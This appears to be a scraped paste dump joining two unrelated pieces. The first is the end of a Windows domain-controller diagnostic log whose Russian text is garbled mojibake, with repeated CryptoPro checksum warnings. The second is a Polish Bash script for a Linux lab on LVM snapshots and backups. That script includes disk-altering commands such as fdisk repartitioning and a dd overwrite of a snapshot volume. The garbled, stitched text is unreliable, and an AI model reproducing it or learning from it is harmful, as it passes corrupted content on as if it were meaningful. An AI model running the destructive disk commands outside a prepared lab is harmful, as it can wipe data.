–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:31
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:45
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:45
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:24:02
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:24:04
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:24:18
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\crypt32.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\crypt32.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:24:18
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:24:18
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ SystemLog
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: VerifyReferences
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ VerifyReferences


   –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–æ–∫ —Ä–∞–∑–¥–µ–ª–æ–≤ –Ω–∞: ForestDnsZones
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: CheckSDRefDom
         ......................... ForestDnsZones - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ CheckSDRefDom
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: CrossRefValidation
         ......................... ForestDnsZones - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ CrossRefValidation

   –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–æ–∫ —Ä–∞–∑–¥–µ–ª–æ–≤ –Ω–∞: DomainDnsZones
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: CheckSDRefDom
         ......................... DomainDnsZones - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ CheckSDRefDom
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: CrossRefValidation
         ......................... DomainDnsZones - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ CrossRefValidation

   –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–æ–∫ —Ä–∞–∑–¥–µ–ª–æ–≤ –Ω–∞: Schema
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: CheckSDRefDom
         ......................... Schema - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ CheckSDRefDom
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: CrossRefValidation
         ......................... Schema - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ CrossRefValidation

   –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–æ–∫ —Ä–∞–∑–¥–µ–ª–æ–≤ –Ω–∞: Configuration
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: CheckSDRefDom
         ......................... Configuration - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ CheckSDRefDom
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: CrossRefValidation
         ......................... Configuration - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ CrossRefValidation

   –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–æ–∫ —Ä–∞–∑–¥–µ–ª–æ–≤ –Ω–∞: florin-trade
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: CheckSDRefDom
         ......................... florin-trade - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ CheckSDRefDom
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: CrossRefValidation
         ......................... florin-trade - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ CrossRefValidation

   –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–æ–∫ –ø—Ä–µ–¥–ø—Ä–∏—è—Ç–∏—è –Ω–∞: florin-trade.ru
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: LocatorCheck
         ......................... florin-trade.ru - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ LocatorCheck
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: Intersite
         ......................... florin-trade.ru - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ Intersite
PS C:\Users\div>




"
aTXFRA7D,sysop_3.1.5_Full,pan7nikt,Bash,Monday 8th of April 2024 03:20:03 AM CDT,"#LEGENDA:
#Kolorowe echo (zaczyna sie \033[0;32m) - GRUPUJE LISTINGI, zalecane
#Zwykle echo - SKROCONE ODPOWIEDZI Z ZASMOLONYCH, opcjonalne
#komendy bez srednikow na koncu - musza byc wykonywane pojedynczo
#komendy ze srednikami - mozna je wkleic do terminala naraz

#PRZED PRZGOTOWANIEM ZADANIA (w komentarzach jest user input)
sudo fdisk /dev/sda
#n
#4 lub enter
#enter
#+1G
#t
#4
#44
#w
sudo pvcreate /dev/sda4
sudo vgextend fedora /dev/sda4
sudo lvextend -L +400M /dev/fedora/home
sudo resize2fs /dev/fedora/home

echo -e '\033[0;32mTWORZENIE MIGAWKI\033[0m';
sudo lvcreate -s -L 100M -pr -n migawka_home /dev/fedora/home

fdisk /dev/sdb
#g
#n
#enter lub 1
#enter
#+2G
#w
sudo mkfs.xfs /dev/sdb1
sudo mkdir /mnt/kopia
sudo mount /dev/sdb1 /mnt/kopia/
sudo dump -0u -f /mnt/kopia/kopia_home /dev/fedora/migawka_home
df /home
df /mnt/kopia/kopia_home
lvdisplay /dev/fedora/migawka_home

#POCZATEK ZADANIA
#3.1.5.1
#Jakie cechy musi posiadaƒá kopia, aby by≈Ça kopiƒÖ zapasowƒÖ?
echo -e '\033[0;32m3.1.5.1\033[0m';
echo -e '\033[0;32mKopia zapasowa musi byc:\033[0m';
echo -e '\033[0;32m- Spojna w czasie\033[0m';
echo -e '(stan plikow z tej samej chwili czasu)';
echo -e '\033[0;32m- Tworzona regularnie\033[0m';
echo -e '\033[0;32m- finalna lokalizacja powinna byc zabezpieczona (dostep, utrata, uszkodzenie)\033[0m';
echo -e '\033[0;32m- Przechowywana na innym fizycznym nosniu danych\033[0m';

df /home | grep /dev/mapper/fedora-home
df /mnt/kopia/kopia_home | grep /dev/sdb1

#3.1.5.2
#Dlaczego narzƒôdziem dump utworzono kopiƒô zapasowƒÖ odczytujƒÖc dane z wolumenu logicznego migawki a nie z wolumenu logicznego, dla kt√≥rego utworzono migawkƒô?
echo -e '\033[0;32m3.1.5.2\033[0m';
echo -e 'Poniewaz migawki udostepniaja spojny stan zawartosci wolumenu logicznego bez koniecznosci zatrzymania realizacji operacji wejscia/wyjscia (spojny czas, mniej bledow)';
#3.1.5.3
echo -e '\033[0;32m3.1.5.3\033[0m'
sudo lvdisplay /dev/fedora/migawka_home

echo -e '\033[0;32mRozmiar bufora:\033[0m'
sudo lvdisplay /dev/fedora/migawka_home | grep ""COW-table size""
echo -e 'Bufor ten okresla ile miejsca jest zarezerwowane dla zmian zapisywanych po utworzeniu migawki'

echo -e '\033[0;32mRozmiar przestrzeni danych wolumenu logicznego migawki:\033[0m'
sudo lvdisplay /dev/fedora/migawka_home | grep ""LV Size""
echo -e 'jest to rozmiar oryginalnego wolumenu, zostal ustawiony automatycznie. Okresla calkowita przestrzen zarezerwowana dla migawki.'

#TUTAJ TRZEBA WYTLUMACZYC JAK MIGAWKA DZIALA (PUNKT 3 ZASMOLONYCH)

#3.1.5.4
# Kiedy stworzona migawka staje siƒô bezu≈ºyteczna? Wykazaƒá, jak rozpoznaƒá bezu≈ºytecznƒÖ migawkƒô.
echo -e '\033[0;32m3.1.5.4\033[0m';
echo 'Kiedy bufor COW sie zapelni (migawka nie jest juz spojna w czasie, czyli nie dostarcza pelnego stanu)';
echo -e '\033[0;32mWykazanie:\033[0m';

sudo lvcreate -L 12M -s -n bezuzyteczna_migawka /dev/fedora/home
sudo dd if=/dev/zero of=/dev/fedora/bezuzyteczna_migawka bs=1M count=12
sudo lvs fedora
echo -e '\033[0;32m100% bufora COW jest zajete:\033[0m'
sudo lvs fedora |& grep 'Data%\|100,00 '

sudo lvdisplay /dev/fedora/bezuzyteczna_migawka
echo -e '\033[0;32mMigawka jest bezuzyteczna (INACTIVE):\033[0m'
sudo lvdisplay /dev/fedora/bezuzyteczna_migawka | grep INACTIVE

#3.1.5.5
#Czy mo≈ºna utworzyƒá migawkƒô, kt√≥ra zawsze bƒôdzie aktywna?
echo -e '\033[0;32m3.1.5.5\033[0m';
echo -e 'Mozna. Jezeli rozmiar bufora COW >= Rozmiar urzadzenia blokowego, dla ktorego wykonano migawke';

#3.1.5.6
#Nale≈ºy utworzyƒá migawkƒô wolumenu logicznego home pracujƒÖcƒÖ w trybie odczyt/zapis o najmniejszym mo≈ºliwym rozmiarze bufora.
#Gdzie bƒôdƒÖ przechowywane bloki zapisane w utworzonym wolumenie logicznym migawki?
echo -e '\033[0;32m3.1.5.6\033[0m';
echo -e 'Najmniejszy mozliwy rozmiar bufora jest rowny rozmiarowi jednostki alokacji PE grupy wolumenow.\nW tym przypadku to 4MiB';
echo -e '\033[0;32mProba ustawienia mniejszego rozmiaru bufora:\033[0m';
